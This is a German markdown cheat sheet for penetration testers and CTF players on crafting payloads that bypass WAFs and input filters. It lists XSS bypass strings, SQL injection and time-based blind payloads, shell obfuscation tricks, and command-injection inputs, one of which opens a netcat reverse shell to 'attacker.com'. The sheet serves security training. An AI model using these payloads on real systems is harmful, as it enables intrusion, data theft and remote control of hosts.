# 🎯 Payload Crafting Tips

**Ziel dieser Datei:**  
Diese Datei bietet eine kompakte Übersicht über Techniken zur Erstellung und Modifikation von Payloads – speziell im Hinblick auf die Umgehung von Web Application Firewalls (WAF), Filtern und anderen sicherheitsrelevanten Eingabekontrollen. Sie richtet sich vor allem an Penetration Tester, CTF-Spieler und Red Team-Mitglieder, die mit komplexen Eingabefiltern konfrontiert sind.

> ⚠️ **Disclaimer:** Diese Inhalte dienen ausschließlich zu Schulungs- und Testzwecken in autorisierten Umgebungen. Die Anwendung in produktiven oder fremden Systemen ohne ausdrückliche Genehmigung ist illegal.

---

## 🔧 Typische Encoding-Techniken

### 1. **URL-Encoding**
Wird oft verwendet, um Sonderzeichen zu maskieren.

| Zeichen | Encoding |
|--------|----------|
| `space` | `%20` oder `+` |
| `'`     | `%27` |
| `"`     | `%22` |
| `<`     | `%3C` |
| `>`     | `%3E` |
| `&`     | `%26` |
| `=`     | `%3D` |

> Beispiel:  
`<script>alert(1)</script>` → `%3Cscript%3Ealert(1)%3C/script%3E`

---

### 2. **Base64-Encoding**
Nützlich bei Befehlseinschleusungen (z. B. in RCEs, SQLi).

Beispiel in PHP:
```php
echo base64_decode('ZWNobyAnSGFja2VkIQ==');

→ Ausgabe: echo 'Hacked!'
```

---

## 3. Hex-Encoding / Char-Bypass
Alternative Darstellung für Payloads.

```sql
SELECT CHAR(65,66,67); -- ergibt "ABC"
```

Für XSS:

```html
<scr<script>ipt>alert(1)</scr<script>ipt>
```
Oder
```html
<svg/onload=String.fromCharCode(97,108,101,114,116)(1)>
```

---

## 🥷 Evasion-Techniken bei WAF / Inputfilter
### 🪤 Zeichen-Splitting / Padding
```html
<scr<script>ipt>
```
```bash
/bin/ba$IFS$IFSsh
```

---

## 🔀 Keywords fragmentieren
```sql
UNION/**/SELECT
```
```php
ec/*comment*/ho "test";
```

---

## ⏳ Zeitbasierte Payloads (blind testing)
Nützlich bei blind RCE oder SQLi:

```sql
' OR IF(1=1,SLEEP(5),0) --
```
```bash
ping -c 5 127.0.0.1
```
---

## 🧪 Beispiele nach Angriffsart
### 📚 SQL Injection
- ' OR 1=1 --
- `admin'/**/OR/**/1=1--+`
- UNION SELECT NULL,NULL,NULL--
- CONCAT(CHAR(117,115,101,114),CHAR(112,119))

### 🐚 Remote Code Execution (RCE)
```bash
127.0.0.1|echo hacked
127.0.0.1;nc -e /bin/bash attacker.com 4444
127.0.0.1&&sleep 5
```

---

## 📌 Hinweise
- Unterschiedliche Filter verlangen unterschiedliche Bypässe. Teste iterativ.
- In CTFs werden häufig Filter eingebaut – Payload-Crafting ist oft die Lösung.
- Nutze Burp Suite's Repeater oder Tools wie wfuzz, ffuf, sqlmap für Automatisierung.

---

## ⚠️ Haftungsausschluss

Dieses Repository dient ausschließlich zu Ausbildungs-, Forschungs- und Demonstrationszwecken im Bereich der IT-Sicherheit.

Alle hier dokumentierten Techniken und Tools dürfen nur in legalen und autorisierten Testumgebungen verwendet werden – z. B. in Labors, CTFs oder mit ausdrücklicher Genehmigung des Eigentümers der Zielsysteme.

Wir distanzieren uns ausdrücklich von jeglicher illegalen Nutzung.
Dieses Projekt richtet sich an White-Hat-Sicherheitsforscher, Ethical Hacker und Auszubildende, die ethisch und rechtlich korrekt handeln.

--- 

Stay curious – stay secure. 🔐

🗓️ **Letzte Aktualisierung:** Juli 2025  
🤝 **Pull Requests willkommen** – Vorschläge für neue Kurse oder Kategorien gerne einreichen!

---

## 🧰 Nützliche Tools
- [🔍 HackBar (Burp Extension)](https://portswigger.net/bappstore/93c19861f4df4e60bd9d4568cdd97ed6)
- [🧪 PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)